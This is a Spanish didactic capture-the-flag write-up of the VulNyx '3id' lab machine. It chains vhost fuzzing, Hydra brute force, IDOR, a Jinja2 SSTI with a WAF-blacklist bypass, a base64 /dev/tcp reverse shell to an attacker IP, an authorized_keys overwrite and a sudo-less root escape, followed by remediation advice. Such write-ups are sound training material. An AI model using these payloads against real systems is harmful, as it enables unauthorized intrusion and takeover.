# Vulnyx — 3id (EidGreetings) · Writeup didáctico

| Característica | Valor |
|---|---|
| Plataforma | VulNyx |
| Máquina | 3id |
| Objetivo | `192.168.0.18` |
| Atacante | `192.168.0.13` |
| Dominio virtual | `beta.3id.nyx` |
---

## 0. Índice

1. [Reconocimiento de red](#1-reconocimiento-de-red)
2. [Escaneo de puertos y servicios](#2-escaneo-de-puertos-y-servicios)
3. [Enumeración web (puerto 80)](#3-enumeración-web-puerto-80)
4. [Las cookies de sesión de Flask](#4-las-cookies-de-sesión-de-flask)
5. [Enumeración de subdominios (vhost fuzzing)](#5-enumeración-de-subdominios-vhost-fuzzing)
6. [Fuerza bruta al login (Hydra)](#6-fuerza-bruta-al-login-hydra)
7. [IDOR: el parámetro que filtra la pista](#7-idor-el-parámetro-que-filtra-la-pista)
8. [SSTI: Server-Side Template Injection](#8-ssti-server-side-template-injection)
9. [Bypass del WAF por blacklist](#9-bypass-del-waf-por-blacklist-la-parte-jugosa)
10. [Reverse shell como www-data](#10-reverse-shell-como-www-data)
11. [Privesc www-data → alouch (ACLs)](#11-privesc-www-data--alouch-abuso-de-acl)
12. [Privesc alouch → root (sudo + less)](#12-privesc-alouch--root-sudo--less)
13. [Lecciones aprendidas y remediación](#13-lecciones-aprendidas-y-remediación)

---

## 1. Reconocimiento de red

Antes de atacar una IP hay que **saber qué hay en el segmento**. Primero identifico mi propia configuración de red para saber en qué rango estoy:

```bash
ip -br addr      # interfaces y sus IPs de un vistazo
ip route         # gateway por defecto
```

![Identificación del segmento de red](images/identificacion_segmento_de_red.png)

![Identificación de la puerta de enlace](images/identificacion_puerta_de_enlace.png)

Salida relevante:
- `eth0 → 192.168.0.13/24` (mi Kali)
- `default via 192.168.0.1 dev eth0` (gateway)

Entonces el segmento es `192.168.0.0/24`. **Host discovery** con nmap usando ARP (`-PR`), que es lo más fiable y rápido dentro de una LAN:

```bash
sudo nmap -sn -PR 192.168.0.0/24 -oA host-discovery-inicial
```

- `-sn` → ping scan, **sin** escanear puertos (solo descubrir hosts vivos).
- `-PR` → descubrimiento por **ARP**. En una red local, ARP no se puede falsificar fácilmente ni bloquear con un firewall de capa 3, así que detecta hosts que ignoran ICMP.

![Host discovery con nmap -sn -PR](images/Host_discovery_full.png)

**¿Por qué ARP y no ICMP?** Muchos hosts tienen el `ping` (ICMP echo) bloqueado por firewall, pero **todos** los equipos de una misma LAN responden ARP porque es el mecanismo que usa Ethernet para resolver IP→MAC. Si están en tu mismo segmento, ARP los ve.

Para quedarme solo con las IPs vivas, parseo el `.gnmap`:

```bash
awk '/Status: Up/ {print $2}' host-discovery-inicial.gnmap
```

![Listado de hosts vivos](images/Host_discovery_list.png)

Entre los hosts aparece `192.168.0.18` con MAC `08:00:27:...` → el prefijo OUI `08:00:27` es de **VirtualBox**, señal clara de que esa es la VM objetivo del lab.

> 💡 **Tip de MAC:** `08:00:27` = VirtualBox, `00:0C:29` / `00:50:56` = VMware, `00:16:3E` = Xen. Reconocer el OUI te dice de inmediato cuál es la máquina virtual del laboratorio dentro de un montón de dispositivos domésticos.

---

## 2. Escaneo de puertos y servicios

Dos pasadas: una **completa y rápida** para descubrir qué puertos están abiertos, y otra **dirigida** para fingerprinting de versiones.

**Pasada 1 — todos los puertos TCP (SYN scan):**

```bash
sudo nmap -sS -p- 192.168.0.18 -oA port-scanning-full-tcp-192.168.0.18
```

- `-sS` → **SYN scan** (half-open). Envía SYN, si recibe SYN/ACK marca abierto y responde RST sin completar el handshake. Más rápido y menos "ruidoso" que un connect completo; necesita privilegios root.
- `-p-` → los **65535** puertos. Nunca te quedes solo con el top-1000: servicios escondidos en puertos altos son pan de cada día.

![Escaneo completo de puertos TCP](images/descubrimiento_de_puertos_TCP_SYN_full.png)

Resultado: **22/tcp** y **80/tcp** abiertos.

**Pasada 2 — versiones solo de los puertos abiertos:**

```bash
sudo nmap -sV -p 22,80 192.168.0.18 -oA service-detection-inicial-192.168.0.18
```

- `-sV` → **service/version detection**. Interroga cada puerto para sacar producto y versión.

![Detección de servicios 22 y 80](images/descubrimiento_de__servicios_22_80.png)

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 7.9p1 Debian 10+deb10u4 |
| 80/tcp | HTTP | nginx 1.14.2 |

El banner `Debian 10` ya nos dice el sistema operativo. Con solo SSH y HTTP, **el vector es la web** (SSH sin credenciales no da nada todavía).

Agrego el host al `/etc/hosts` para poder navegarlo por nombre:

```bash
echo "192.168.0.18  3id.nyx" | sudo tee -a /etc/hosts
```

---

## 3. Enumeración web (puerto 80)

Navego `http://3id.nyx`: una app llamada **EidGreetings v1.0**, portal interno de la empresa ficticia "KyubiSec Inc.". Páginas visibles: **Home, About Us, Contact Us, Login**.

![Inspección web puerto 80 — Home](images/Inspecci_n_de_web_en_puerto_80_1.png)

![Inspección web puerto 80 — Login](images/Inspecci_n_de_web_en_puerto_80_2.png)

![Inspección web puerto 80 — Contact](images/Inspecci_n_de_web_en_puerto_80_3.png)

La página de **Contact** deja una pista sutil para más adelante:

> *"...or have questions about its current features (including **view rendering options**)..."*

"View rendering options" es un guiño a que **la app renderiza contenido**, lo que semánticamente apunta a un motor de plantillas (futuro SSTI).

**Fuzzing de directorios** con gobuster:

```bash
gobuster dir -u http://3id.nyx/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt -t 30 -o gobuster-medium.txt
```

- `dir` → modo de descubrimiento de rutas.
- `-x php,html,txt` → prueba esas extensiones además del nombre pelado.
- `-t 30` → 30 hilos.

![gobuster dir en la raíz del puerto 80](images/gobuster_medium_raiz_puerto_80.png)

Rutas encontradas:

| Ruta | Estado | Nota |
|------|--------|------|
| `/contact` | 200 | Página de contacto |
| `/about` | 200 | Sobre la empresa |
| `/login` | 200 | Formulario de login |
| `/profile` | 302 → `/login` | Requiere sesión |
| `/logout` | 302 → `/` | |
| `/greetings` | 302 → `/login` | Requiere sesión |

Las redirecciones **302 → /login** en `/profile` y `/greetings` confirman que hay zona autenticada. Necesitamos credenciales.

---

## 4. Las cookies de sesión de Flask

En `/login` pruebo credenciales de prueba `test:test`. Falla con *"Invalid username or password. Please try again."*

![Prueba de login con test:test](images/prueba_usuario_test_y_password_test.png)

Capturo la petición en Burp:

![Petición POST del panel de login en Burp](images/request_POST_panel_login.png)

```http
POST /login HTTP/1.1
Host: 3id.nyx
Content-Type: application/x-www-form-urlencoded
Cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.aXNuQ.TCfK2KQiaOVj-IvQGO5XfK7BWoO

username=test&password=test
```

Esa cookie `session=` con formato `<payload>.<timestamp>.<firma>` es la **firma inconfundible de Flask**.

### Teoría: ¿cómo funcionan las sesiones de Flask?

Flask, por defecto, usa **client-side sessions**: el contenido de la sesión viaja **en la propia cookie del cliente**, no en el servidor. La cookie tiene 3 partes separadas por puntos:

1. **Payload** — un diccionario en base64 (¡legible!).
2. **Timestamp** — cuándo se generó.
3. **Firma HMAC** — para garantizar integridad.

Punto clave: **la cookie está firmada, no cifrada**. Cualquiera puede *leer* el contenido; lo que no puede es *modificarlo* sin invalidar la firma... salvo que conozca el `SECRET_KEY` de la app.

Decodifico con `flask-unsign`:

```bash
flask-unsign --decode --cookie 'eyJfcGVybWFuZW50Ijp0cnVlfQ.aXNuQ.TCfK2KQiaOVj-IvQGO5XfK7BWoO'
# → {'_permanent': True}
```

![Decodificando la cookie de Flask](images/decodificando_cookie_flask.png)

Solo contiene `{'_permanent': True}` porque el login falló; con una sesión válida contendría el usuario, rol, etc.

**Intento de forjar la sesión** crackeando el `SECRET_KEY` por diccionario:

```bash
flask-unsign --unsign \
  --cookie 'eyJfcGVybWFuZW50Ijp0cnVlfQ.aXNuQ.TCfK2KQiaOVj-IvQGO5XfK7BWoO' \
  --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
```

![Crackeo de la cookie — tarda mucho, desisto](images/ccrackeando_cookie_tarda_mucho_desisto.png)

En esta máquina el proceso es **muy lento** y no sale con rockyou → **lo descarto**. No siempre el primer camino es el bueno; un buen pentester no se obstina, pivota. (Guardamos la técnica para otra ocasión: si el `SECRET_KEY` fuera débil, podríamos firmar una sesión con `username: admin` y entrar sin contraseña.)

> 🧠 **Instalación de flask-unsign en Kali:** por PEP-668 (`externally-managed-environment`) usá `pipx install flask-unsign` o un venv, no `pip install` a secas.

---

## 5. Enumeración de subdominios (vhost fuzzing)

`3id.nyx` es un dominio del lab, **no tiene DNS real**. Por eso el fuzzing de subdominios en modo DNS (resolviendo `*.3id.nyx` contra un servidor) **no sirve**: no hay nada que resuelva. La técnica correcta es **vhost fuzzing**: pegarle siempre a la misma IP variando el header `Host:` para ver qué virtual hosts responden distinto.

```bash
gobuster vhost -u http://3id.nyx \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  --append-domain -t 50 -k
```

- `vhost` → modo virtual host (cambia el header `Host`, no el DNS).
- `--append-domain` → prueba `FUZZ.3id.nyx` (sin esto probaría solo `FUZZ`, inútil).
- `-k` → ignora errores TLS.

![Descubrimiento de subdominios con gobuster vhost](images/D_escubrimiento_de_subdominios_con_gobuster.png)

### Teoría: Virtual Hosts

Un mismo servidor web (una sola IP) puede servir **muchos sitios distintos** según el valor del header `Host:` que mande el cliente (name-based virtual hosting). Al fuzzear ese header, descubrimos sitios que **no están enlazados** desde ningún lado y que el DNS público no conoce.

Resultado:

```
beta.3id.nyx    Status: 200  [Size: 1931]
```

El resto devuelve `400`/mismo tamaño (ruido). Agrego el vhost al hosts:

```bash
# /etc/hosts
192.168.0.18  3id.nyx beta.3id.nyx
```

---

## 6. Fuerza bruta al login (Hydra)

Visito `http://beta.3id.nyx` → **"EidGreetings v1.1 - Beta Testing Notes"**, una página de notas internas de QA.

![Inspección del subdominio beta](images/inspecciono_subdominio_beta.png)

Entre los "Known Issues" filtra un **nombre de usuario real**:

> *"User profile page for **alouch** sometimes fails to load avatar from network share. Need to check permissions."*

![Descubrimiento del usuario alouch en el subdominio beta](images/descubrimiento_usuario_alouch_en_subdominio_beta.png)

¡Tenemos usuario! `alouch`. Ahora fuerza bruta de la contraseña contra el login con **Hydra**:

```bash
hydra -l alouch \
  -P /usr/share/wordlists/rockyou.txt \
  -s 80 -t 40 -W 1 -f \
  -o hydra-rockyou-alouch.txt \
  3id.nyx http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid username or password. Please try again."
```

Desglose del módulo `http-post-form`, que es lo que más cuesta al principio. El formato es `"ruta:cuerpo:condición"`:

- `"/login"` → la ruta del POST.
- `username=^USER^&password=^PASS^` → el cuerpo tal cual lo manda el navegador; Hydra sustituye `^USER^` y `^PASS^`.
- `F=Invalid username or password. Please try again.` → **condición de fallo**. Hydra marca como válido cualquier intento cuya respuesta **NO** contenga ese texto.

Flags:
- `-l alouch` → usuario fijo.
- `-P rockyou.txt` → diccionario de contraseñas.
- `-s 80` → puerto.
- `-f` → **frena** al encontrar la primera válida.
- `-W 1` → 1 seg de espera entre intentos (suaviza).

> ⚠️ **La condición `F=` (o `S=`) es la clave.** Tenés que loguear a mano con credenciales malas y copiar **el texto de error exacto** que devuelve la app. Si te equivocás en una coma, Hydra reporta todo como válido (falsos positivos) o nada.

![Fuerza bruta al usuario alouch con Hydra](images/fuerza_bruta_a_usuario_alouch.png)

Resultado:

```
[80][http-post-form] host: 3id.nyx   login: alouch   password: 123
```

**Credenciales: `alouch:123`.**

---

## 7. IDOR: el parámetro que filtra la pista

Logueado como `alouch`, el dashboard muestra saludos. Al abrir uno:

```
http://3id.nyx/greet/share?id=1
```

![Ingreso como alouch e identifico un parámetro id](images/Ingreso_como_alouch_e_identifico_un_parametro_id.png)

→ "Eid Mubarak! ... By: The Management". El parámetro **`id`** selecciona qué saludo se muestra. Primer instinto: **IDOR** (Insecure Direct Object Reference) — cambiar el `id` para ver objetos que no me corresponden.

### Teoría: IDOR

Una app es vulnerable a IDOR cuando usa un identificador controlado por el usuario (`id=1`, `id=2`...) para acceder a un recurso **sin verificar que ese usuario tenga permiso** sobre él. Cambiando el número, accedés a datos de otros.

Pruebo `id=2`:

```
http://3id.nyx/greet/share?id=2
```

![IDOR: id=2 me permite ver la palabra template](images/Pruebo_idor_que_me_permite_ver_la_palabra_template.png)

→ aparece una **"Dev Note: Urgent"** que no era para mis ojos:

> *"...especially input sanitization for **template engine v0.9**... We need to be careful with the **`template` debug parameter on `/greet/share`**, it's only for internal testing."*

Oro puro. El IDOR nos filtró:
- Que existe un **motor de plantillas** (→ SSTI).
- El nombre de un **parámetro oculto de debug**: `template`.
- La ruta donde vive: `/greet/share`.

> 🧠 **Metodología:** cuando encontrás un parámetro tipo `id`, primero **abusalo para leer lo que no deberías** (IDOR). Lo que leas ahí suele darte el **siguiente vector**. Enumeración antes que explotación.

---

## 8. SSTI: Server-Side Template Injection

Pruebo el parámetro filtrado con la carga de detección clásica:

```
http://3id.nyx/greet/share?id=2&template={{9*9}}
```

![Prueba de SSTI con el parámetro template — devuelve 81](images/Pruebo_ssti_con_el_par_metro_template.png)

→ la página responde **`81`**.

Que `{{9*9}}` se evalúe a `81` **confirma SSTI**: nuestra entrada se inserta en una plantilla que el servidor **renderiza** en vez de tratarla como texto.

### Teoría: ¿Qué es SSTI?

Los motores de plantillas (Jinja2 en Flask, Twig en PHP, etc.) mezclan HTML con expresiones que el servidor evalúa. Si la app mete **input del usuario dentro de la plantilla** (en vez de pasarlo como *dato*), el atacante puede inyectar sintaxis de plantilla. En Jinja2, `{{ expresión }}` se evalúa del lado del servidor → se puede escalar a **ejecución de código Python** → RCE.

Un detalle clave acá: la respuesta es **solo** `81`, lo que indica que la app usa `render_template_string()` directamente sobre nuestro input (sin sandbox). Eso es RCE casi asegurado.

### ¿Por qué `id` no funcionaba y `template` sí?

El parámetro `id` se usa para **buscar** un saludo en la base de datos (es un *dato*), nunca llega a una plantilla → por eso `id={{8*8}}` solo daba "Greeting Not Found". El sink real es `template`, que la app imprime de vuelta renderizándolo.

---

## 9. Bypass del WAF por blacklist (la parte jugosa)

El payload clásico de RCE en Jinja2 es:

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

Pero al enviarlo salta un **"ACCESS DENIED — Detected Pattern: os"**. Hay un **WAF por lista negra de palabras**.

![Pruebo con cycler pero está bloqueado](images/pruebo_con_cycler_pero_est__bloqueado.png)

Y es **incremental**: cada vez que esquivamos una palabra, bloquea la siguiente. El orden que fue apareciendo:

```
os  →  popen  →  read  →  cycler  →  lipsum  →  request  →  config
```

![Bloqueo de otra palabra de la blacklist](images/bloqueo_2.png)

![Reverse shell en base64 bloqueado — intento 1](images/envio_reverse_shell_en_base64_resultado_bloqueado_intento_1.png)

### Teoría: cómo pensar un bypass de blacklist

El filtro inspecciona el **texto** del payload buscando palabras prohibidas, pero **no entiende lo que el texto hace en runtime**. Entonces la estrategia es: **construir las palabras prohibidas en tiempo de ejecución** para que nunca aparezcan literales en el request. Dos herramientas:

**(a) Partir strings y reconcatenar.** En Jinja2:
- Operador `~` (concatenación de Jinja): `'o'~'s'` → `'os'`.
- Método `.__add__()`: `"o".__add__("s")` → `"os"`.

Ninguna de las dos formas contiene la subcadena `os` en el texto, pero ambas evalúan a `os`.

**(b) Acceso por atributo dinámico** con el filtro `|attr()`:
- `obj.popen` bloqueado → `obj|attr('po'~'pen')` arma el nombre del método sin escribirlo.

**(c) Cambiar el objeto de entrada** cuando bloquean su nombre. `cycler`, `lipsum`, `joiner`, `namespace` son todos de `jinja2.utils` (que importa `os`) → son intercambiables. Si bloquean todos, se usa un **literal** (`[]`, `()`, `''`) como punto de partida, que **no se puede meter en una blacklist** sin romper la app.

### El payload final (sin ningún nombre de gadget)

Partiendo de una lista vacía `[]` y recorriendo la jerarquía de clases de Python:

```python
{{ [].__class__.__base__.__subclasses__()[262].__init__.__globals__["o".__add__("s")].__dict__.listdir('/') }}
```

**Analizándolo pieza por pieza:**

| Fragmento | Qué hace |
|-----------|----------|
| `[].__class__` | clase `list` |
| `.__base__` | su padre: `object` |
| `.__subclasses__()` | **todas** las subclases de `object` cargadas en el proceso |
| `[262]` | una subclase concreta cuyos `__globals__` contienen el módulo `os` |
| `.__init__.__globals__` | el namespace global de esa clase (donde vive `os`) |
| `["o".__add__("s")]` | construye la clave `"os"` sin escribirla → el módulo `os` |
| `.__dict__.listdir('/')` | llama a `os.listdir('/')` |

Resultado: **listó la raíz** `['root','etc','mnt','var',...,'home']` → tenemos el **módulo `os` completo** en la mano, esquivando todo el WAF. Ninguna palabra prohibida aparece literal.

> ⚠️ **El índice `[262]` depende de la versión de Python.** Lo que en una máquina es `262`, en otra puede ser otro número (cambia según qué módulos estén importados). Siempre hay que **confirmar el índice** con una prueba inofensiva como `listdir('/')` antes de armar la shell.

---

## 10. Reverse shell como www-data

De `listdir` a **shell**: cambio `listdir` por `system` (también construido con `.__add__()`) y le paso un reverse shell **en base64**.

### ¿Por qué base64?

El reverse shell `bash -i >& /dev/tcp/IP/443 0>&1` está lleno de caracteres que rompen la URL y el shell: `&` (separador de parámetros en la URL), `>`, comillas, espacios. Metiéndolo en **base64**, todo eso desaparece: base64 es solo `[A-Za-z0-9+/=]`. El servidor lo decodifica y ejecuta:

```bash
echo <BASE64> | base64 -d | bash
```

**1. Genero el base64 del reverse shell** (con mi IP `192.168.0.13` y puerto `443`):

```bash
echo -n 'bash -i >& /dev/tcp/192.168.0.13/443 0>&1' | base64 -w0
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTMvNDQzIDA+JjE=
```

![Genero el reverse shell en base64](images/geenro_reverse_shell_intento_1.png)

**2. Levanto el listener:**

```bash
nc -lvnp 443
```

![Puerto de escucha 443](images/Puerto_de_escucha_443_intento_1.png)

**3. Disparo el payload con curl** (`--data-urlencode` evita todos los problemas de escaping del navegador):

```bash
B64=$(echo -n 'bash -i >& /dev/tcp/192.168.0.13/443 0>&1' | base64 -w0)

curl -G 'http://3id.nyx/greet/share' \
  --data-urlencode 'id=2' \
  --data-urlencode "template={{[].__class__.__base__.__subclasses__()[262].__init__.__globals__[\"o\".__add__(\"s\")].__dict__[\"sys\".__add__(\"tem\")]('echo $B64|base64 -d|bash')}}" \
  -b 'session=TU_COOKIE_DE_SESION'
```

- `["sys".__add__("tem")]` → arma `system` sin escribirlo → `os.system(...)`.
- Con `system` **no hace falta `.read()`** (que estaba bloqueado): el proceso se ejecuta igual y el reverse shell conecta solo.

![Reverse shell intento 3 — payload satisfactorio](images/Reverse_shell_intento_3_satisfactorio.png)

Resultado en el listener:

```
connect to [192.168.0.13] from (UNKNOWN) [192.168.0.18] 33058
www-data@3id:/home/alouch/eid_app$ whoami
www-data
```

![Reverse shell recibida — intento 3 exitoso](images/Reverse_shell_recibida_intento_3_exitoso.png)

**¡Shell como `www-data`!** Y arranca en `/home/alouch/eid_app` (el código de la app corre desde ahí).

**Estabilizo la TTY** (sin esto no hay Ctrl+C, flechas ni autocompletado):

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 11. Privesc www-data → alouch (abuso de ACL)

Como la shell cae en el home de `alouch`, enumero su carpeta `.ssh`:

```bash
ls -ld / /home /home/alouch /home/alouch/.ssh /home/alouch/.ssh/authorized_keys
```

![Enumero los archivos .ssh de alouch](images/enumero_archivos_ssh.png)

```
drwx--x--+ 7 alouch alouch 4096 Jun 12  2025 /home/alouch
drwx--x--+ 4 alouch alouch 4096 Jun  9  2025 /home/alouch/.ssh
-rw-rw----+ 1 alouch alouch    1 Jun 11  2025 /home/alouch/.ssh/authorized_keys
```

El **`+`** al final de los permisos indica una **ACL (Access Control List)**. Los permisos POSIX clásicos dicen `alouch alouch`, pero la ACL otorga permisos **extra** a otros usuarios. De hecho, `www-data` ya pudo entrar a `/home/alouch` (ahí cayó la shell), lo que confirma que la ACL le da acceso.

### Teoría: ACLs de POSIX

Las ACLs amplían el modelo clásico *owner/group/other* permitiendo reglas por usuario o grupo individual. Se inspeccionan con `getfacl`:

```bash
getfacl /home/alouch/.ssh/authorized_keys
getfacl /home/alouch/.ssh
```

Si hay una línea tipo `user:www-data:rw-`, significa que **`www-data` puede escribir** el `authorized_keys` de `alouch`. Y si podemos escribir ahí → metemos **nuestra propia clave pública SSH** y entramos como `alouch`.

### Explotación

**1. Genero un par de claves en mi Kali:**

```bash
ssh-keygen -t ed25519 -f alouch_key -N ''
cat alouch_key.pub
# ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... kali@kali
```

![Genero la clave SSH en mi Kali](images/genero_clave_ssh_en_mi_kali.png)

- `-t ed25519` → tipo de clave (moderna y corta).
- `-f alouch_key` → archivo de salida.
- `-N ''` → sin passphrase (cómodo para automatizar).

**2. Desde la shell de `www-data`, escribo mi clave pública** en el `authorized_keys` de alouch:

```bash
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... kali@kali' > /home/alouch/.ssh/authorized_keys
```

![Agrego la clave SSH en la VM víctima](images/agrego__clave_ssh_en_la_vm_victoima.png)

(El archivo pesaba 1 byte, prácticamente vacío, así que sobrescribir con `>` no rompe nada.)

**3. Me conecto por SSH como `alouch`:**

```bash
ssh -i alouch_key alouch@3id.nyx
```

![Ingreso como alouch por SSH con las claves agregadas](images/ingreso_como_alouch_por_ssh_con_las_claves_agregadas.png)

```
WELCOME TO 3ID MACHINE VIA SSH
alouch@3id:~$
```

**¡Shell estable como `alouch`!** Capturo la primera flag:

```bash
cat /home/alouch/user.txt
# 1e85d5f5c85452d9fab192313bd0f0c6
```

![Obtengo user.txt](images/obtengo_usertxt.png)

> 🧠 **¿Por qué una clave SSH y no sacar la contraseña?** Aunque ya teníamos `alouch:123`, escribir la clave en `authorized_keys` nos da una **shell completa e interactiva** por SSH (TTY real, persistente), muchísimo más cómoda que la reverse shell de la app. Además demuestra el impacto del fallo de ACL.

---

## 12. Privesc alouch → root (sudo + less)

Primer reflejo tras conseguir un usuario: revisar qué puede ejecutar con `sudo`:

```bash
sudo -l
```

![Identifico maintenance_cleanup.sh como root en el sudo de alouch](images/identifico_mainteance_cleanupsh_como_root_en_el_sudo_de_alouch.png)

```
User alouch may run the following commands on 3id:
    (root) NOPASSWD: /opt/eid_scripts/maintenance_cleanup.sh
```

`alouch` puede correr ese script **como root y sin contraseña**. Veo qué hace:

```bash
ls -l /opt/eid_scripts/maintenance_cleanup.sh
cat /opt/eid_scripts/maintenance_cleanup.sh
```

```bash
#!/bin/bash
# EidGreetings System Log Maintenance and Review Script
DEFAULT_LOG="/var/log/eidgreetings/app.log"
VIEW_FILE="${1:-$DEFAULT_LOG}"

if [ ! -f "$VIEW_FILE" ]; then
    echo "Error: File '$VIEW_FILE' not found."
    exit 1
fi

# The script uses 'less' to view the file, which can be escaped
/usr/bin/less "$VIEW_FILE"
```

El propio script deja el comentario: *"...which can be escaped"*. El script hace `less "$ARCHIVO"` **como root**, y nosotros controlamos `$ARCHIVO` (primer argumento).

### Teoría: GTFOBins y el escape de `less`

[GTFOBins](https://gtfobins.github.io/) cataloga binarios de Unix que pueden usarse para **romper restricciones**. `less` es un paginador interactivo que permite ejecutar comandos de shell desde su interfaz con `!`. Si `less` corre como root, **el comando que lancés con `!` también corre como root**.

### Explotación

```bash
sudo /opt/eid_scripts/maintenance_cleanup.sh /etc/passwd
```

- Le paso `/etc/passwd` (un archivo que **existe**, para superar el `if [ ! -f ... ]` y que sea multilínea, de modo que `less` entre en modo paginado).
- `less` abre el archivo **como root**.

Ya dentro de `less`, escribo:

```
!/bin/bash
```

y Enter. `less` ejecuta `/bin/bash` → **shell como root**.

![Escalada a root](images/escalada_a_root.png)

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
# 6d15b6b430f520414880172533f184f8
```

![Obtengo la flag root](images/obtengo_flag_root.png)

**¡ROOT! 🏆**

---

## 13. Lecciones aprendidas y remediación

### Resumen de la cadena de ataque

```
Recon LAN (ARP) ─► nmap (22,80) ─► web EidGreetings
       │
       ├─► vhost fuzzing ─► beta.3id.nyx ─► fuga de usuario "alouch"
       │
       ├─► Hydra ─► alouch:123
       │
       ├─► IDOR (id=2) ─► filtra parámetro "template"
       │
       ├─► SSTI (Jinja2) ─► bypass WAF (~ / .__add__ / [262]) ─► RCE www-data
       │
       ├─► ACL en authorized_keys ─► SSH como alouch ─► user.txt
       │
       └─► sudo less (GTFOBins) ─► root ─► root.txt
```

### Flags

| Flag | Valor |
|------|-------|
| `user.txt` | `1e85d5f5c85452d9fab192313bd0f0c6` |
| `root.txt` | `6d15b6b430f520414880172533f184f8` |

### Vulnerabilidades y cómo se arreglan

| # | Fallo | Remediación |
|---|-------|-------------|
| 1 | **Info leak en vhost beta** (usuario `alouch`, parámetro de debug) | No exponer entornos de staging/beta en el mismo servidor; no publicar notas internas accesibles sin auth |
| 2 | **Contraseña débil** (`123`) + login sin rate-limiting | Política de contraseñas fuerte, bloqueo tras N intentos, MFA, captcha |
| 3 | **IDOR** en `/greet/share?id=` | Verificar que el usuario tenga permiso sobre cada objeto que solicita (control de acceso a nivel de objeto) |
| 4 | **SSTI** por `render_template_string` sobre input | **Nunca** meter input en la plantilla; pasar datos como contexto (`render_template(..., var=input)`); usar `SandboxedEnvironment` |
| 5 | **WAF por blacklist** (bypasseable) | Las blacklists son un parche, no una solución. El arreglo real es (4): no evaluar input como plantilla |
| 6 | **ACL permisiva** en `authorized_keys` | `www-data` nunca debe poder escribir el `.ssh` de otro usuario; revisar ACLs con `getfacl -R` |
| 7 | **sudo a script que invoca `less`** | No dar sudo a binarios/scripts que permiten escape a shell; si hace falta ver logs, usar `cat`/`sudoedit` con rutas fijas y validadas |

### Herramientas usadas

`nmap`, `gobuster` (dir + vhost), `flask-unsign`, `hydra`, `burpsuite`, `curl`, `ssh-keygen`, `getfacl`, `nc`, y conocimiento de **GTFOBins**.

---

> **Nota ética:** este writeup documenta la explotación de una máquina de laboratorio (Vulnyx), diseñada legalmente para practicar. No apliques estas técnicas sobre sistemas sin autorización explícita.
